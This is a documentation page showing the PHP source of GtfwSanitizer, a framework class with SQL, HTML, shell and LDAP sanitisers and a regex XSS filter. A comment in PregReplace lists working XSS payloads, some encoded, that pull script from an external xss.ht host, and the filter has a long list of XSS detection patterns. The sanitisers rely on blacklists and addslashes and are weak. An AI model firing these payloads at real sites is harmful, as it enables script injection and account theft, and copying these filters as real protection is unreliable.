.. raw:: html

    <details>
    <summary>Full source code GtfwSanitizer</summary>

.. code-block:: php
   :linenos: 
   :caption: Source code @main/system/core/sanitizer/GtfwSanitizer.class.php

    <?php
    /**
    GtfwSanitizer
        class baru untuk menangani sanitasi string,
        berbeda dengan old version yang selalu create object per variable.
        class ini sesuai fungsi nya hanya sebagai class pemroses sanitasi

    @author 	:	Wahyu A.Y

    @modified	:
    @copyright 2014 Gamatechno
    */

    class GtfwSanitizer extends GtfwBaseSingleton{
        private $mGpcsOn;
        private $suffix = '';

        public function init($mGpcsOn = false){
            $this->mGpcsOn = (bool) $mGpcsOn;
            if($this->mGpcsOn)$this->suffix = 'Gpc';
            else $this->suffix = '';
        }
        
        public function stripTags($var){
            return $this->StripHtmlTags($var);
        }
        
        public function AddSlashes($var){
            return addslashes($var);
        }

        public function AddSlashesGpc($var){
            return $var;
        }

        // sanitize a string for SQL input (simple slash out quotes and slashes)
        public function SqlString($var){
            $func = 'AddSlashes' . $this->suffix;
            return str_replace(';', '', $this->$func($var));
        }

        // sanitize a string for HTML (make sure nothing gets interpretted!)
        public function StripHtmlTags($var) {
            $pattern = array(
                '&', '<', '>', "\n", '"',
                '\'', '%', '(', ')', '+',
                '-'
            );
            $replace = array(
                '&amp;', '&lt;', '&gt;', '<br>', '&quot;',
                '&#39;', '&#37;', '&#40;', '&#41;', '&#43;',
                '&#45;'
            );
            return str_replace($pattern, $replace, $var);
        }

        public function Raw($var) {
            return $var;
        }

        // paranoid sanitization -- only let the alphanumeric set through
        public function AlphaNumeric($var) {
            return preg_replace("/[^a-zA-Z0-9]/", '', $var);
        }

        // sanitize a string in prep for passing a single argument to system() (or similar)
        public function SystemString($var) {
            $pattern = '/(;|\||`|>|<|&|^|"|'."\n|\r|'".'|{|}|[|]|\)|\()/i'; // no piping, passing possible environment variables ($),
                // seperate commands, nested execution, file redirection,
                // background processing, special commands (backspace, etc.), quotes
                // newlines, or some other special characters
            $string = preg_replace($pattern, '', $var);
            $string = '"'.str_replace('\$', '\\\$', $string).'"'; //make sure this is only interpretted as ONE argument
            return $string;
        }

        // sanitize a string for SQL input (simple slash out quotes and slashes)
        public function LdapString($var) {
            return preg_replace('/(\)|\(|\||&)/', '', $var);
        }

        //---- taken from OWAS.org: owasp-php-filters.zip
        public function Utf8Decode($var) {
            return strtr($var, "???????���������������������������", "SOZsozYYuAAAAAAACEEEEIIIIDNOOOOOOUUUUYsaaaaaaaceeeeiiiionoooooouuuuyy");
        }

        public function encodeTags($var){
            $str = htmlentities($var, ENT_COMPAT, 'UTF-8');
            return $str;
        }

        public function PregReplace($var = ""){
            /*
            sample payload xss
            $string = '"><script src=https://imadd23xssht.xss.ht></script>';
            $string .= "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://imadd23xssht.xss.ht\';document.body.appendChild(a)')";
            $string .= "><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaW1hZGQyM3hzc2h0Lnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>";
            $string .= "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaW1hZGQyM3hzc2h0Lnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>";
            $string .= "><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaW1hZGQyM3hzc2h0Lnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;>";
            $string .= '><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;imadd23xssht.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">';
            $string .= '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//imadd23xssht.xss.ht");a.send();</script>';
            $string .= '<script>$.getScript("//imadd23xssht.xss.ht")</script>';
            */
            if (is_null($var)) return "";
            
            $patterns = array();
            $patterns[] = '/\"><script(.*)<\/script>/i';
            $patterns[] = '/<script(.*)<\/script>/i';
            $patterns[] = '/\'>(.*)<\/script>/i';
            $patterns[] = '/">(.*)<\/script>/i';
            $patterns[] = '/javascript:eval\((.*)\)/i';
            $patterns[] = '/onfocus=(.*);/i';
            $patterns[] = '/onfocus=\"(.*)\"/i';
            $patterns[] = '/onfocus=\'(.*)\'/i';
            $patterns[] = '/onfocus(.*)>/i';
            $patterns[] = '/onerror=(.*);/i';
            $patterns[] = '/onerror=\"(.*)\"/i';
            $patterns[] = '/onerror=\'(.*)\'/i';
            $patterns[] = '/onerror(.*)>/i';
            $patterns[] = '/srcdoc=(.*);/i';
            $patterns[] = '/srcdoc=\"(.*)\"/i';
            $patterns[] = '/srcdoc=\'(.*)\'/i';
            $patterns[] = '/srcdoc(.*)>/i';
            $patterns[] = '/javascript:\/(.*)\'>/i';
            $patterns[] = '/<IMG SRC=\"javascript(.*)\);\">/i';
            $patterns[] = '/<IMG SRC=\'javascript(.*)\);\'>/i';
            $patterns[] = '/<IMG SRC=javascript(.*)>/i';
            $patterns[] = '/<IMG SRC=javascript:(.*)>/i';
            $patterns[] = '/<IMG SRC=`javascript(.*)`>/i';
            $patterns[] = '/onmouseover=(.*);/i';
            $patterns[] = '/onmouseover=\"(.*)\"/i';
            $patterns[] = '/onmouseover=\'(.*)\'/i';
            $patterns[] = '/onmouseover(.*)>/i';
            $patterns[] = '/<IMG SRC=&#106;(.*)&#41;>/i';
            $patterns[] = '/<IMG SRC=\'&#106;(.*)&#41;\'>/i';
            $patterns[] = '/<IMG SRC=\"&#106;(.*)&#41;\">/i';
            $patterns[] = '/<IMG SRC=&#0000106(.*)&#0000041>/i';
            $patterns[] = '/<IMG SRC=\'&#0000106(.*)&#0000041\'>/i';
            $patterns[] = '/<IMG SRC=\"&#0000106(.*)&#0000041\">/i';
            $patterns[] = '/<IMG SRC=&#x6A(.*)&#x29>/i';
            $patterns[] = '/<IMG SRC=\'&#x6A(.*)&#x29\'>/i';
            $patterns[] = '/<IMG SRC=\"&#x6A(.*)&#x29\">/i';
            $patterns[] = '/<IMG SRC=\"jav(.*)\">/i';
            $patterns[] = '/<IMG SRC=\'jav(.*)\'>/i';
            $patterns[] = '/<IMG SRC=jav(.*)>/i';
            $patterns[] = '/<IMG SRC=\" &#14;(.*);\">/i';
            $patterns[] = '/<IMG SRC=\' &#14;(.*);\'>/i';
            $patterns[] = '/<IMG SRC= &#14;(.*);>/i';
            $patterns[] = '/<SCRIPT\/XSS SRC=\"(.*);<\/SCRIPT>/i';
            $patterns[] = '/<SCRIPT\/XSS SRC=\'(.*);<\/SCRIPT>/i';
            $patterns[] = '/<SCRIPT\/XSS SRC=(.*);<\/SCRIPT>/i';
            $patterns[] = '/onload!#\$(.*)>/i';
            $patterns[] = '/<iframe(.*)<\/iframe>/i';
            $patterns[] = '/<iframe(.*)>/i';
            $patterns[] = '/<iframe(.*)</i';
            $patterns[] = '/SRC=\"java(.*)\"/i';
            $patterns[] = '/SRC=\'java(.*)\'/i';
            $patterns[] = '/SRC=java(.*)>/i';
            $patterns[] = '/BACKGROUND=\"java(.*)\"/i';
            $patterns[] = '/BACKGROUND=\'java(.*)\'/i';
            $patterns[] = '/BACKGROUND=java(.*)>/i';
            $patterns[] = '/DYNSRC=\"java(.*)\"/i';
            $patterns[] = '/DYNSRC=\'java(.*)\'/i';
            $patterns[] = '/DYNSRC=java(.*)>/i';
            $patterns[] = '/LOWSRC=\"java(.*)\"/i';
            $patterns[] = '/LOWSRC=\'java(.*)\'/i';
            $patterns[] = '/LOWSRC=java(.*)>/i';
            $patterns[] = '/url\(\"javascript(.*)\"\)/i';
            $patterns[] = '/url\(\'javascript(.*)\'\)/i';
            $patterns[] = '/url\(javascript(.*)\)/i';
            $patterns[] = '/SRC=\'vbscript(.*)\'/i';
            $patterns[] = '/SRC=\"vbscript(.*)\"\)/i';
            $patterns[] = '/SRC=vbscript(.*)>/i';
            $patterns[] = '/SRC=\'livescript(.*)\'/i';
            $patterns[] = '/SRC=\"livescript(.*)\"/i';
            $patterns[] = '/SRC=livescript(.*)>/i';
            $patterns[] = '/onload=\"(.*)\"/i';
            $patterns[] = '/onload=\'(.*)\'/i';
            $patterns[] = '/onload=(.*)>/i';
            $patterns[] = '/onload=(.*)>/i';
            $patterns[] = '/onload(.*)>/i';
            $patterns[] = '/Set.constructor`(.*)`/i';
            $patterns[] = '/\"javascript:(.*)\"/i';
            $patterns[] = '/\'javascript:(.*)\'/i';
            $patterns[] = '/javascript:(.*);/i';
            $patterns[] = '/<STYLE TYPE=\"text\/javascript\">(.*)<\/STYLE>/i';
            $patterns[] = '/<STYLE TYPE=\'text\/javascript\'>(.*)<\/STYLE>/i';
            $patterns[] = '/<STYLE TYPE=\'text\/javascript\'>(.*)<\/STYLE>/i';
            $patterns[] = '/<STYLE TYPE=text\/javascript>(.*)<\/STYLE>/i';
            $patterns[] = '/ession\((.*)\)/i';
            $patterns[] = '/behavior:(.*);/i';
            $patterns[] = '/<META(.*)>/i';
            $patterns[] = '/<FRAMESET(.*)FRAMESET>/i';
            $patterns[] = '/background-image:\0075\0072(.*)\0029>/i';
            $patterns[] = '/expression\((.*)\)/i';
            $patterns[] = '/<OBJECT(.*)OBJECT>/i';
            $patterns[] = '/<EMBED(.*)EMBED>/i';
            $patterns[] = '/eval\((.*)\)/i';
            $patterns[] = '/<XML(.*)XML>/i';
            $patterns[] = '/DATASRC=\"(.*)\"/i';
            $patterns[] = '/DATASRC=\'(.*)\'/i';
            $patterns[] = '/DATASRC=(.*)>/i';
            $patterns[] = '/IPT>(.*)<\/SCRIPT>/i';

            $replacements = array();
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';
            $replacements[] = '';

            // print_r($patterns);
            // print_r('<br><br>');
            // print_r($replacements); die();

            $str = preg_replace($patterns, $replacements, $var);
            return $str;
        }

    }
    ?>

.. raw:: html

    </details>